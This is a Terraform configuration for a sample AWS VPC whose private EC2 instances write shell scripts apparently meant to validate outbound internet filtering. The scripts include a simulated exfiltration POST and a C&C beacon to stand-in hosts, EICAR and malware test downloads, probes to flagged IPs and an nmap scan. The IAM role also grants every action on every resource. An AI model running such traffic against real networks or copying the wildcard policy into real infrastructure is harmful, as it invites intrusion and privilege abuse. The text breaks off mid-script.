# ----------------------------------------------------------
# Sample VPC (us-east-1): VPC, Subnets, Route Tables, Security, IAM, EC2, ALBs
# ----------------------------------------------------------
# This file creates a sample VPC in us-east-1 with two public subnets,
# route tables, security group, IAM role/profile, and two EC2 instances.
# Best Practice: Use one subnet per AZ for high availability.
# ----------------------------------------------------------

# 1. Data Sources
# ----------------------------------------------------------
# Get latest Ubuntu 22.04 AMI for us-east-1
# Canonical official AMI
# Used for EC2 instances
# ----------------------------------------------------------
data "aws_ami" "ubuntu2204" {
  most_recent = true
  owners      = ["099720109477"] # Canonical
  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"]
  }
  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }
}

# 2. Networking: VPC, IGW, Subnets, Route Tables
# ----------------------------------------------------------
# Create VPC
# ----------------------------------------------------------
resource "aws_vpc" "sample_vpc" {
  cidr_block = "10.0.0.0/16"
  tags = { Name = "${var.prefix}-vpc" }
}

# Create Internet Gateway for VPC
# ----------------------------------------------------------
resource "aws_internet_gateway" "sample_internet_gateway" {
  tags = { Name = "${var.prefix}-igw" }
}

# Attach Internet Gateway to VPC
# ----------------------------------------------------------
resource "aws_internet_gateway_attachment" "sample_igw_attachment" {
  internet_gateway_id = aws_internet_gateway.sample_internet_gateway.id
  vpc_id              = aws_vpc.sample_vpc.id
}

# Public Subnets (renamed)
# ----------------------------------------------------------
resource "aws_subnet" "sample_subnet1" {
  availability_zone = var.aws_availability_zone1
  vpc_id            = aws_vpc.sample_vpc.id
  cidr_block        = "10.0.1.0/24"
  tags = { Name = "${var.prefix}-z1-public-subnet" }
}
resource "aws_subnet" "sample_subnet2" {
  availability_zone = var.aws_availability_zone2
  vpc_id            = aws_vpc.sample_vpc.id
  cidr_block        = "10.0.2.0/24"
  tags = { Name = "${var.prefix}-z2-public-subnet" }
}

# Private Subnets
# ----------------------------------------------------------
resource "aws_subnet" "sample_private_subnet1" {
  availability_zone = var.aws_availability_zone1
  vpc_id            = aws_vpc.sample_vpc.id
  cidr_block        = "10.0.11.0/24"
  tags = { Name = "${var.prefix}-z1-private-subnet" }
}
resource "aws_subnet" "sample_private_subnet2" {
  availability_zone = var.aws_availability_zone2
  vpc_id            = aws_vpc.sample_vpc.id
  cidr_block        = "10.0.12.0/24"
  tags = { Name = "${var.prefix}-z2-private-subnet" }
}

# Public Route Table (combined)
# ----------------------------------------------------------
resource "aws_route_table" "sample_public_rt" {
  vpc_id = aws_vpc.sample_vpc.id
  tags = { Name = "${var.prefix}-public-rt" }
}
resource "aws_route" "sample_public_internet_route" {
  route_table_id         = aws_route_table.sample_public_rt.id
  destination_cidr_block = "0.0.0.0/0"
  gateway_id             = aws_internet_gateway.sample_internet_gateway.id
}
resource "aws_route_table_association" "sample_subnet1_public_rt" {
  route_table_id = aws_route_table.sample_public_rt.id
  subnet_id      = aws_subnet.sample_subnet1.id
}
resource "aws_route_table_association" "sample_subnet2_public_rt" {
  route_table_id = aws_route_table.sample_public_rt.id
  subnet_id      = aws_subnet.sample_subnet2.id
}

# Private Route Table
# ----------------------------------------------------------
resource "aws_route_table" "sample_private_rt" {
  vpc_id = aws_vpc.sample_vpc.id
  tags = { Name = "${var.prefix}-private-rt" }
}
resource "aws_route_table_association" "sample_private_subnet1_private_rt" {
  route_table_id = aws_route_table.sample_private_rt.id
  subnet_id      = aws_subnet.sample_private_subnet1.id
}
resource "aws_route_table_association" "sample_private_subnet2_private_rt" {
  route_table_id = aws_route_table.sample_private_rt.id
  subnet_id      = aws_subnet.sample_private_subnet2.id
}

# NAT Gateway for Private Subnets
resource "aws_eip" "nat_eip" {
  depends_on = [aws_internet_gateway.sample_internet_gateway]
}

resource "aws_nat_gateway" "sample_nat_gw" {
  allocation_id = aws_eip.nat_eip.id
  subnet_id     = aws_subnet.sample_subnet1.id # Place NAT GW in a public subnet (AZ1)
  depends_on    = [aws_internet_gateway_attachment.sample_igw_attachment]
  tags = { Name = "${var.prefix}-nat-gw" }
}

resource "aws_route" "private_internet_route" {
  route_table_id         = aws_route_table.sample_private_rt.id
  destination_cidr_block = "0.0.0.0/0"
  nat_gateway_id         = aws_nat_gateway.sample_nat_gw.id
}

# 3. Security
# ----------------------------------------------------------
# Security group for EC2 and ALB
# Allows HTTP, HTTPS, port 8000, and all egress
# ----------------------------------------------------------
resource "aws_security_group" "sample_security_group" {
  name   = "${var.prefix}-security-group"
  vpc_id = aws_vpc.sample_vpc.id
  egress {
    protocol    = "-1"
    from_port   = 0
    to_port     = 0
    cidr_blocks = ["0.0.0.0/0"]
  }
  ingress {
    protocol    = "tcp"
    from_port   = 80
    to_port     = 80
    cidr_blocks = ["0.0.0.0/0"]
  }
  ingress {
    protocol    = "tcp"
    from_port   = 8000
    to_port     = 8000
    cidr_blocks = ["0.0.0.0/0"]
  }
  ingress {
    protocol    = "tcp"
    from_port   = 443
    to_port     = 443
    cidr_blocks = ["0.0.0.0/0"]
  }
  ingress {
    protocol    = "icmp"
    from_port   = -1
    to_port     = -1
    cidr_blocks = ["0.0.0.0/0"]
  }
  tags = { Name = "${var.prefix}-security-group" }
}

# 4. IAM
# ----------------------------------------------------------
# IAM role and instance profile for EC2
# ----------------------------------------------------------
resource "aws_iam_role" "spoke_iam_role" {
  name = "${var.prefix}-spoke-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17",
    Statement = [
      {
        Effect = "Allow",
        Principal = {
          Service = [
            "ec2.amazonaws.com",
            "ecs-tasks.amazonaws.com"
          ]
        },
        Action = "sts:AssumeRole"
      }
    ]
  })
  path = "/"
}

resource "aws_iam_role_policy_attachment" "ecs_task_execution" {
  role       = aws_iam_role.spoke_iam_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy"
}

resource "aws_iam_role_policy" "spoke_iam_policy" {
  name = "spoke-iam-policy"
  role = aws_iam_role.spoke_iam_role.id
  policy = jsonencode({
    Version = "2012-10-17",
    Statement = [
      {
        Action   = "*"
        Resource = "*"
        Effect   = "Allow"
      }
    ]
  })
}

resource "aws_iam_instance_profile" "spoke_instance_profile" {
  name = aws_iam_role.spoke_iam_role.name
  path = "/"
  role = aws_iam_role.spoke_iam_role.name
}

# 5. EC2 Instances
# ----------------------------------------------------------
resource "aws_instance" "app_instance1" {
  associate_public_ip_address = true
  availability_zone           = var.aws_availability_zone1
  ami                         = data.aws_ami.ubuntu2204.id
  iam_instance_profile        = aws_iam_instance_profile.spoke_instance_profile.name
  instance_type               = "t2.nano"
  key_name                    = var.aws_ssh_key_pair_name
  user_data                   = <<EOT
#!/bin/bash
sudo apt-get update
sudo apt-get install -y apache2 wget
sudo mkdir -p /var/www/html/alb
FQDN=$(hostname -f)
LOCALIP=$(hostname -I | awk '{print $1}')
PUBLICIP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)
AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
cat <<EOF > /var/www/html/index.html
<html><body>
<h2>EC2 Instance Info (Root)</h2>
<p>FQDN: $FQDN</p>
<p>Internal IP: $LOCALIP</p>
<p>Public IP: $PUBLICIP</p>
<p>AZ: $AZ</p>
</body></html>
EOF
cat <<EOF > /var/www/html/alb/index.html
<html><body>
<h2>EC2 Instance Info (ALB Directory)</h2>
<p>FQDN: $FQDN</p>
<p>Internal IP: $LOCALIP</p>
<p>Public IP: $PUBLICIP</p>
<p>AZ: $AZ</p>
</body></html>
EOF
EOT
  subnet_id                   = aws_subnet.sample_subnet1.id
  vpc_security_group_ids      = [aws_security_group.sample_security_group.id]
  tags = {
    Name = "${var.prefix}-z1-app"
    Category = "prod"
  }
}

resource "aws_instance" "app_instance2" {
  associate_public_ip_address = true
  availability_zone           = var.aws_availability_zone2
  ami                         = data.aws_ami.ubuntu2204.id
  iam_instance_profile        = aws_iam_instance_profile.spoke_instance_profile.name
  instance_type               = "t2.nano"
  key_name                    = var.aws_ssh_key_pair_name
  user_data                   = <<EOT
#!/bin/bash
sudo apt-get update
sudo apt-get install -y apache2 wget
sudo mkdir -p /var/www/html/alb
FQDN=$(hostname -f)
LOCALIP=$(hostname -I | awk '{print $1}')
PUBLICIP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)
AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
cat <<EOF > /var/www/html/index.html
<html><body>
<h2>EC2 Instance Info :: (Root)</h2>
<p>FQDN: $FQDN</p>
<p>Internal IP: $LOCALIP</p>
<p>Public IP: $PUBLICIP</p>
<p>AZ: $AZ</p>
</body></html>
EOF
cat <<EOF > /var/www/html/alb/index.html
<html><body>
<h2>EC2 Instance Info :: (ALB Directory)</h2>
<p>FQDN: $FQDN</p>
<p>Internal IP: $LOCALIP</p>
<p>Public IP: $PUBLICIP</p>
<p>AZ: $AZ</p>
</body></html>
EOF
EOT
  subnet_id                   = aws_subnet.sample_subnet2.id
  vpc_security_group_ids      = [aws_security_group.sample_security_group.id]
  tags = {
    Name = "${var.prefix}-z2-app"
    Category = "dev"
  }
}

# Private EC2 Instances for Security Testing
# ----------------------------------------------------------
resource "aws_instance" "private_instance1" {
  associate_public_ip_address = false
  availability_zone           = var.aws_availability_zone1
  ami                         = data.aws_ami.ubuntu2204.id
  iam_instance_profile        = aws_iam_instance_profile.spoke_instance_profile.name
  instance_type               = "t2.nano"
  key_name                    = var.aws_ssh_key_pair_name
  user_data                   = <<EOT
#!/bin/bash
sudo apt-get update
sudo apt-get install -y curl wget nmap dnsutils netcat-openbsd
sudo apt-get install -y apache2
FQDN=$(hostname -f)
LOCALIP=$(hostname -I | awk '{print $1}')
AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
cat <<EOF > /var/www/html/index.html
<html><body>
<h2>Private EC2 Instance Info (AZ1)</h2>
<p>FQDN: $FQDN</p>
<p>Internal IP: $LOCALIP</p>
<p>AZ: $AZ</p>
<p>Role: Security Testing Instance</p>
</body></html>
EOF

# Ensure ubuntu user home directory exists and has proper permissions
sudo mkdir -p /home/ubuntu
sudo chown ubuntu:ubuntu /home/ubuntu

# Create test scripts for security testing with proper sudo permissions
sudo cat <<'SCRIPT' > /home/ubuntu/test_internet.sh
#!/bin/bash
echo "=== Internet Connectivity Test ==="
echo "Testing basic connectivity..."
sudo curl -s http://httpbin.org/ip
echo ""
echo "Testing DNS resolution..."
sudo nslookup google.com
echo ""
echo "Testing HTTPS..."
sudo curl -s https://httpbin.org/get | head -20
SCRIPT

sudo cat <<'SCRIPT' > /home/ubuntu/test_malicious.sh
#!/bin/bash
echo "=== Malicious URL/IP Testing ==="
echo "WARNING: These are test URLs/IPs for security testing"
echo ""

# Test known malicious domains (EICAR test domains)
echo "Testing potentially malicious domains..."
sudo curl -s --connect-timeout 5 http://malware.testing.google.test/testing/malware/ || echo "Blocked or failed"
sudo curl -s --connect-timeout 5 http://testsafebrowsing.appspot.com/s/malware.html || echo "Blocked or failed"

# Test suspicious file downloads
echo "Testing suspicious file downloads..."
sudo curl -s --connect-timeout 5 -o /tmp/eicar.txt http://www.eicar.org/download/eicar.com.txt || echo "Download blocked or failed"

# Test command and control simulation
echo "Testing C&C simulation..."
sudo curl -s --connect-timeout 5 http://example.com:8080/beacon || echo "Connection blocked or failed"

# Test data exfiltration simulation
echo "Testing data exfiltration patterns..."
sudo curl -s --connect-timeout 5 -X POST -d "sensitive_data=test123" http://suspicious-domain.example || echo "POST blocked or failed"
SCRIPT

# Create AWS services testing script with sudo permissions
sudo cat <<'SCRIPT' > /home/ubuntu/test_aws_services.sh
#!/bin/bash
echo "=== Comprehensive AWS Services Communication Test ==="
echo "Testing communication between EC2 and various AWS services..."
echo ""

# Get AWS region and instance metadata
echo "=== Instance Metadata ==="
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
ACCOUNT_ID=$(curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | jq -r '.AccountId' 2>/dev/null || echo "N/A")
echo "Region: $REGION"
echo "Instance ID: $INSTANCE_ID"
echo "Account ID: $ACCOUNT_ID"
echo ""

# Test S3 service communication
echo "=== S3 Service Test ==="
echo "Listing S3 buckets..."
aws s3 ls || echo "S3 access failed/blocked"
echo ""
echo "Testing S3 API endpoint connectivity..."
curl -s --connect-timeout 10 https://s3.$REGION.amazonaws.com/ || echo "S3 endpoint connection failed"
echo ""

# Test CloudTrail service
echo "=== CloudTrail Service Test ==="
echo "Describing CloudTrail trails..."
aws cloudtrail describe-trails --region $REGION || echo "CloudTrail access failed/blocked"
echo ""

# Test EC2 service communication
echo "=== EC2 Service Test ==="
echo "Describing current instance..."
aws ec2 describe-instances --instance-ids $INSTANCE_ID --region $REGION --query 'Reservations[0].Instances[0].{InstanceId:InstanceId,State:State.Name,Type:InstanceType}' || echo "EC2 API access failed/blocked"
echo ""

# Test IAM service
echo "=== IAM Service Test ==="
echo "Getting current user/role..."
aws sts get-caller-identity || echo "STS/IAM access failed/blocked"
echo ""

# Test VPC/Networking services
echo "=== VPC Service Test ==="
echo "Describing VPCs..."
aws ec2 describe-vpcs --region $REGION --max-items 5 || echo "VPC API access failed/blocked"
echo ""

# Test CloudWatch service
echo "=== CloudWatch Service Test ==="
echo "Listing CloudWatch metrics..."
aws cloudwatch list-metrics --region $REGION --max-items 5 || echo "CloudWatch access failed/blocked"
echo ""

# Test Systems Manager (SSM)
echo "=== Systems Manager Test ==="
echo "Getting SSM parameters..."
aws ssm describe-parameters --region $REGION --max-items 5 || echo "SSM access failed/blocked"
echo ""

# Test Route 53 service
echo "=== Route 53 Service Test ==="
echo "Listing hosted zones..."
aws route53 list-hosted-zones --max-items 5 || echo "Route53 access failed/blocked"
echo ""

# Test CloudFormation service
echo "=== CloudFormation Service Test ==="
echo "Listing CloudFormation stacks..."
aws cloudformation list-stacks --region $REGION --max-items 5 || echo "CloudFormation access failed/blocked"
echo ""

# Test ELB service
echo "=== Load Balancer Service Test ==="
echo "Describing load balancers..."
aws elbv2 describe-load-balancers --region $REGION --max-items 5 || echo "ELB access failed/blocked"
echo ""

# Test CloudFront service
echo "=== CloudFront Service Test ==="
echo "Listing CloudFront distributions..."
aws cloudfront list-distributions --max-items 5 || echo "CloudFront access failed/blocked"
echo ""

# Test RDS service
echo "=== RDS Service Test ==="
echo "Describing RDS instances..."
aws rds describe-db-instances --region $REGION --max-items 5 || echo "RDS access failed/blocked"
echo ""

# Test Lambda service
echo "=== Lambda Service Test ==="
echo "Listing Lambda functions..."
aws lambda list-functions --region $REGION --max-items 5 || echo "Lambda access failed/blocked"
echo ""

# Test API Gateway
echo "=== API Gateway Service Test ==="
echo "Listing REST APIs..."
aws apigateway get-rest-apis --region $REGION --limit 5 || echo "API Gateway access failed/blocked"
echo ""

# Test AWS Config
echo "=== AWS Config Service Test ==="
echo "Describing configuration recorders..."
aws configservice describe-configuration-recorders --region $REGION || echo "Config access failed/blocked"
echo ""

# Test Security services
echo "=== Security Services Test ==="
echo "Testing GuardDuty..."
aws guardduty list-detectors --region $REGION || echo "GuardDuty access failed/blocked"
echo ""
echo "Testing Inspector..."
aws inspector2 list-findings --region $REGION --max-results 5 || echo "Inspector access failed/blocked"
echo ""

# Test networking endpoints
echo "=== AWS Service Endpoints Test ==="
echo "Testing various AWS service endpoints..."
for service in "ec2" "s3" "iam" "cloudformation" "cloudwatch" "logs" "ssm"; do
    echo "Testing $service endpoint..."
    curl -s --connect-timeout 5 https://$service.$REGION.amazonaws.com/ || echo "$service endpoint failed"
done
echo ""

# Test specific S3 operations
echo "=== S3 Operations Test ==="
echo "Testing S3 bucket operations..."
BUCKET_NAME="test-bucket-$(date +%s)"
echo "Attempting to create test bucket: $BUCKET_NAME"
aws s3 mb s3://$BUCKET_NAME --region $REGION 2>/dev/null && {
    echo "Bucket created successfully"
    echo "Testing file upload..."
    echo "test content" > /tmp/test.txt
    aws s3 cp /tmp/test.txt s3://$BUCKET_NAME/ && echo "File uploaded successfully"
    echo "Testing file download..."
    aws s3 cp s3://$BUCKET_NAME/test.txt /tmp/test_download.txt && echo "File downloaded successfully"
    echo "Cleaning up test bucket..."
    aws s3 rm s3://$BUCKET_NAME/test.txt
    aws s3 rb s3://$BUCKET_NAME
    rm -f /tmp/test.txt /tmp/test_download.txt
} || echo "S3 bucket operations failed/blocked"
echo ""

echo "=== AWS Services Test Complete ==="
SCRIPT

chmod +x /home/ubuntu/test_*.sh
chown ubuntu:ubuntu /home/ubuntu/test_*.sh

# Create comprehensive test script
cat <<'SCRIPT' > /home/ubuntu/comprehensive_test.sh
#!/bin/bash
echo "=== Starting Comprehensive Security Test ==="
echo "Date: $(date)"
echo "Instance: $(hostname)"
echo "Private IP: $(hostname -I | awk '{print $1}')"
echo ""

echo "1. Basic connectivity test..."
./test_internet.sh
echo ""

echo "2. AWS Services communication test..."
./test_aws_services.sh
echo ""

echo "3. Malicious URL test..."
./test_malicious.sh
echo ""

echo "4. Additional network tests..."
echo "Testing suspicious IPs..."
for ip in "185.220.101.1" "198.51.100.1" "203.0.113.1"; do
  echo "Testing $ip..."
  curl -s --connect-timeout 5 http://$ip || echo "Connection to $ip failed/blocked"
done

echo ""
echo "5. Port scanning simulation..."
nmap -sT -p 22,80,443,8080 google.com 2>/dev/null || echo "Port scanning blocked/failed"

echo ""
echo "=== Test Complete ==="
SCRIPT

# Set proper permissions for all scripts with sudo
sudo chmod +x /home/ubuntu/*.sh
sudo chown ubuntu:ubuntu /home/ubuntu/*.sh

# Create convenience script for SSM Session Manager users
sudo cat <<'SCRIPT' > /home/ubuntu/setup_ssm_scripts.sh
#!/bin/bash
echo "Setting up scripts for SSM Session Manager..."
echo "Current directory: $(pwd)"
echo "Home directory: $HOME"

# Copy scripts to current directory if we're in an SSM session
if [[ "$PWD" =~ ^/var/snap/amazon-ssm-agent/.* ]]; then
    echo "Detected SSM Session Manager directory"
    echo "Copying test scripts to current location..."
    sudo cp /home/ubuntu/test_*.sh ./
    sudo cp /home/ubuntu/comprehensive_test.sh ./
    sudo chmod +x *.sh
    echo "Scripts copied successfully!"
    echo ""
    echo "Available scripts in current directory:"
    ls -la *.sh
else
    echo "Not in SSM session directory, scripts available at /home/ubuntu/"
    echo "Available scripts:"
    ls -la /home/ubuntu/*.sh
fi

echo ""
echo "Usage:"
echo "  ./test_internet.sh      - Test basic connectivity"
echo "  ./test_malicious.sh     - Test malicious URLs"
echo "  ./test_aws_services.sh  - Test AWS services"
echo "  ./comprehensive_test.sh - Run all tests"
SCRIPT

sudo chmod +x /home/ubuntu/setup_ssm_scripts.sh
sudo chown ubuntu:ubuntu /home/ubuntu/setup_ssm_scripts.sh

# Install AWS CLI using apt (proven to work)
echo "Installing AWS CLI..."
sudo apt-get update
sudo apt-get install -y awscli curl unzip jq ncat socat tcpdump

# Verify AWS CLI installation
sudo aws --version || echo "AWS CLI installation may have failed"

# Create helpful message for users
sudo cat <<'MESSAGE' > /home/ubuntu/README_TESTING.txt
=== Security Testing Scripts ===

Scripts Location: /home/ubuntu/

If connecting via SSM Session Manager:
1. Run: /home/ubuntu/setup_ssm_scripts.sh
   This will copy scripts to your current SSM session directory

Available Test Scripts:
- test_internet.sh      : Basic connectivity testing
- test_malicious.sh     : Malicious URL/IP testing  
- test_aws_services.sh  : AWS services communication testing
- comprehensive_test.sh : All tests combined

Usage Examples:
  sudo ./test_internet.sh
  sudo ./comprehensive_test.sh
  
For SSM users:
  /home/ubuntu/setup_ssm_scripts.sh
  sudo ./comprehensive_test.sh

Scripts are designed to work with MCD internet filtering validation.
MESSAGE

sudo chown ubuntu:ubuntu /home/ubuntu/README_TESTING.txt

# Create script recreation utility in case scripts have issues
sudo cat <<'RECREATE' > /home/ubuntu/recreate_scripts.sh
#!/bin/bash
echo "Recreating all test scripts..."

# Ensure directory and permissions
sudo mkdir -p /home/ubuntu
sudo chown ubuntu:ubuntu /home/ubuntu

# Recreate test_internet.sh
cat <<'SCRIPT' > /home/ubuntu/test_internet.sh
#!/bin/bash
echo "=== Internet Connectivity Test ==="
echo "Testing basic connectivity..."
curl -s http://httpbin.org/ip || echo "Failed to get IP"
echo ""
echo "Testing DNS resolution..."
nslookup google.com || echo "DNS resolution failed"
echo ""
echo "Testing HTTPS..."
curl -s https://httpbin.org/get | head -20 || echo "HTTPS test failed"
SCRIPT

# Recreate test_malicious.sh  
cat <<'SCRIPT' > /home/ubuntu/test_malicious.sh
#!/bin/bash
echo "=== Malicious URL/IP Testing ==="
echo "WARNING: These are test URLs/IPs for security testing"
echo ""
echo "Testing potentially malicious domains..."
curl -s --connect-timeout 5 http://malware.testing.google.test/testing/malware/ || echo "Blocked or failed"
curl -s --connect-timeout 5 http://testsafebrowsing.appspot.com/s/malware.html || echo "Blocked or failed"
echo "Testing suspicious file downloads..."
curl -s --connect-timeout 5 -o /tmp/eicar.txt http://www.eicar.org/download/eicar.com.txt || echo "Download blocked or failed"
echo "Testing C&C simulation..."
curl -s --connect-timeout 5 http://example.com:8080/beacon || echo "Connection blocked or failed"
echo "Testing data exfiltration patterns..."
curl -s --connect-timeout 5 -X POST -d "sensitive_data=test123" http://suspicious-domain.example || echo "POST blocked or failed"
SCRIPT

# Recreate comprehensive test
cat <<'SCRIPT' > /home/ubuntu/comprehensive_test.sh
#!/bin/bash
echo "=== Starting Comprehensive Security Test ==="
echo "Date: $(date)"
echo "Instance: $(hostname)"
echo "Private IP: $(hostname -I | awk '{print $1}')"
echo ""

echo "1. Basic connectivity test..."
/home/ubuntu/test_internet.sh
echo ""

echo "2. Malicious URL test..."
/home/ubuntu/test_malicious.sh
echo ""

echo "3. Additional network tests..."
echo "Testing suspicious IPs..."
for ip in "185.220.101.1" "198.51.100.1" "203.0.113.1"; do
  echo "Testing $ip..."
  curl -s --connect-timeout 5 http://$ip || echo "Connection to $ip failed/blocked"
done

echo ""
echo "4. Port scanning simulation..."
nmap -sT -p 22,80,443,8080 google.com 2>/dev/null || echo "Port scanning blocked/failed"

echo ""
echo "=== Test Complete ==="
SCRIPT

# Set proper permissions
chmod +x /home/ubuntu/test_*.sh
chmod +x /home/ubuntu/comprehensive_test.sh
chown ubuntu:ubuntu /home/ubuntu/*.sh

echo "Scripts recreated successfully!"
echo "Available scripts:"
ls -la /home/ubuntu/*.sh
RECREATE

sudo chmod +x /home/ubuntu/recreate_scripts.sh
sudo chown ubuntu:ubuntu /home/ubuntu/recreate_scripts.sh

# Ensure final permissions are correct
sudo chmod +x /home/ubuntu/*.sh
sudo chown ubuntu:ubuntu /home/ubuntu/*

# Log the completion
echo "Script setup completed at $(date)" | sudo tee -a /var/log/user-data-setup.log

EOT
  subnet_id                   = aws_subnet.sample_private_subnet1.id
  vpc_security_group_ids      = [aws_security_group.sample_security_group.id]
  tags = {
    Name = "${var.prefix}-z1-private-test"
    Category = "security-testing"
    Environment = "private"
  }
}

resource "aws_instance" "private_instance2" {
  associate_public_ip_address = false
  availability_zone           = var.aws_availability_zone2
  ami                         = data.aws_ami.ubuntu2204.id
  iam_instance_profile        = aws_iam_instance_profile.spoke_instance_profile.name
  instance_type               = "t2.nano"
  key_name                    = var.aws_ssh_key_pair_name
  user_data                   = <<EOT
#!/bin/bash
sudo apt-get update
sudo apt-get install -y curl wget nmap dnsutils netcat-openbsd
sudo apt-get install -y apache2
FQDN=$(hostname -f)
LOCALIP=$(hostname -I | awk '{print $1}')
AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
cat <<EOF > /var/www/html/index.html
<html><body>
<h2>Private EC2 Instance Info (AZ2)</h2>
<p>FQDN: $FQDN</p>
<p>Internal IP: $LOCALIP</p>
<p>AZ: $AZ</p>
<p>Role: Security Testing Instance</p>
</body></html>
EOF

# Ensure ubuntu user home directory exists and has proper permissions
sudo mkdir -p /home/ubuntu
sudo chown ubuntu:ubuntu /home/ubuntu

# Create test scripts for security testing with proper sudo permissions
sudo cat <<'SCRIPT' > /home/ubuntu/test_internet.sh
#!/bin/bash
echo "=== Internet Connectivity Test ==="
echo "Testing basic connectivity..."
sudo curl -s http://httpbin.org/ip
echo ""
echo "Testing DNS resolution..."
sudo nslookup google.com
echo ""
echo "Testing HTTPS..."
sudo curl -s https://httpbin.org/get | head -20
SCRIPT

sudo cat <<'SCRIPT' > /home/ubuntu/test_malicious.sh
#!/bin/bash
echo "=== Malicious URL/IP Testing ==="
echo "WARNING: These are test URLs/IPs for security testing"
echo ""

# Test known malicious domains (EICAR test domains)
echo "Testing potentially malicious domains..."
sudo curl -s --connect-timeout 5 http://malware.testing.google.test/testing/malware/ || echo "Blocked or failed"
sudo curl -s --connect-timeout 5 http://testsafebrowsing.appspot.com/s/malware.html || echo "Blocked or failed"

# Test suspicious file downloads
echo "Testing suspicious file downloads..."
sudo curl -s --connect-timeout 5 -o /tmp/eicar.txt http://www.eicar.org/download/eicar.com.txt || echo "Download blocked or failed"

# Test command and control simulation
echo "Testing C&C simulation..."
sudo curl -s --connect-timeout 5 http://example.com:8080/beacon || echo "Connection blocked or failed"

# Test data exfiltration simulation
echo "Testing data exfiltration patterns..."
sudo curl -s --connect-timeout 5 -X POST -d "sensitive_data=test123" http://suspicious-domain.example || echo "POST blocked or failed"
SCRIPT

# Create AWS services testing script with sudo permissions
sudo cat <<'SCRIPT' > /home/ubuntu/test_aws_services.sh
#!/bin/bash
echo "=== Comprehensive AWS Services Communication Test ==="
echo "Testing communication between EC2 and various AWS services..."
echo ""

# Get AWS region and instance metadata
echo "=== Instance Metadata ==="
REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
ACCOUNT_ID=$(curl -s http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | jq -r '.AccountId' 2>/dev/null || echo "N/A")
echo "Region: $REGION"
echo "Instance ID: $INSTANCE_ID"
echo "Account ID: $ACCOUNT_ID"
echo ""

# Test S3 service communication
echo "=== S3 Service Test ==="
echo "Listing S3 buckets..."
aws s3 ls || echo "S3 access failed/blocked"
echo ""
echo "Testing S3 API endpoint connectivity..."
curl -s --connect-timeout 10 https://s3.$REGION.amazonaws.com/ || echo "S3 endpoint connection failed"
echo ""

# Test CloudTrail service
echo "=== CloudTrail Service Test ==="
echo "Describing CloudTrail trails..."
aws cloudtrail describe-trails --region $REGION || echo "CloudTrail access failed/blocked"
echo ""

# Test EC2 service communication
echo "=== EC2 Service Test ==="
echo "Describing current instance..."
aws ec2 describe-instances --instance-ids $INSTANCE_ID --region $REGION --query 'Reservations[0].Instances[0].{InstanceId:InstanceId,State:State.Name,Type:InstanceType}' || echo "EC2 API access failed/blocked"
echo ""

# Test IAM service
echo "=== IAM Service Test ==="
echo "Getting current user/role..."
aws sts get-caller-identity || echo "STS/IAM access failed/blocked"
echo ""

# Test VPC/Networking services
echo "=== VPC Service Test ==="
echo "Describing VPCs..."
aws ec2 describe-vpcs --region $REGION --max-items 5 || echo "VPC API access failed/blocked"
echo ""

# Test CloudWatch service
echo "=== CloudWatch Service Test ==="
echo "Listing CloudWatch metrics..."
aws cloudwatch list-metrics --region $REGION --max-items 5 || echo "CloudWatch access failed/blocked"
echo ""

# Test Systems Manager (SSM)
echo "=== Systems Manager Test ==="
echo "Getting SSM parameters..."
aws ssm describe-parameters --region $REGION --max-items 5 || echo "SSM access failed/blocked"
echo ""

# Test Route 53 service
echo "=== Route 53 Service Test ==="
echo "Listing hosted zones..."
aws route53 list-hosted-zones --max-items 5 || echo "Route53 access failed/blocked"
echo ""

# Test CloudFormation service
echo "=== CloudFormation Service Test ==="
echo "Listing CloudFormation stacks..."
aws cloudformation list-stacks --region $REGION --max-items 5 || echo "CloudFormation access failed/blocked"
echo ""

# Test ELB service
echo "=== Load Balancer Service Test ==="
echo "Describing load balancers..."
aws elbv2 describe-load-balancers --region $REGION --max-items 5 || echo "ELB access failed/blocked"
echo ""

# Test CloudFront service
echo "=== CloudFront Service Test ==="
echo "Listing CloudFront distributions..."
aws cloudfront list-distributions --max-items 5 || echo "CloudFront access failed/blocked"
echo ""

# Test RDS service
echo "=== RDS Service Test ==="
echo "Describing RDS instances..."
aws rds describe-db-instances --region $REGION --max-items 5 || echo "RDS access failed/blocked"
echo ""

# Test Lambda service
echo "=== Lambda Service Test ==="
echo "Listing Lambda functions..."
aws lambda list-functions --region $REGION --max-items 5 || echo "Lambda access failed/blocked"
echo ""

# Test API Gateway
echo "=== API Gateway Service Test ==="
echo "Listing REST APIs..."
aws apigateway get-rest-apis --region $REGION --limit 5 || echo "API Gateway access failed/blocked"
echo ""

# Test AWS Config
echo "=== AWS Config Service Test ==="
echo "Describing configuration recorders..."
aws configservice describe-configuration-recorders --region $REGION || echo "Config access failed/blocked"
echo ""

# Test Security services
echo "=== Security Services Test ==="
echo "Testing GuardDuty..."
aws guardduty list-detectors --region $REGION || echo "GuardDuty access failed/blocked"
echo ""
echo "Testing Inspector..."
aws inspector2 list-findings --region $REGION --max-results 5 || echo "Inspector access failed/blocked"
echo ""

# Test networking endpoints
echo "=== AWS Service Endpoints Test ==="
echo "Testing various AWS service endpoints..."
for service in "ec2" "s3" "iam" "cloudformation" "cloudwatch" "logs" "ssm"; do
    echo "Testing $service endpoint..."
    curl -s --connect-timeout 5 https://$service.$REGION.amazonaws.com/ || echo "$service endpoint failed"
done
echo ""

# Test specific S3 operations
echo "=== S3 Operations Test ==="
echo "Testing S3 bucket operations..."
BUCKET_NAME="test-bucket-$(date +%s)"
echo "Attempting to create test bucket: $BUCKET_NAME"
aws s3 mb s3://$BUCKET_NAME --region $REGION 2>/dev/null && {
    echo "Bucket created successfully"
    echo "Testing file upload..."
    echo "test content" > /tmp/test.txt
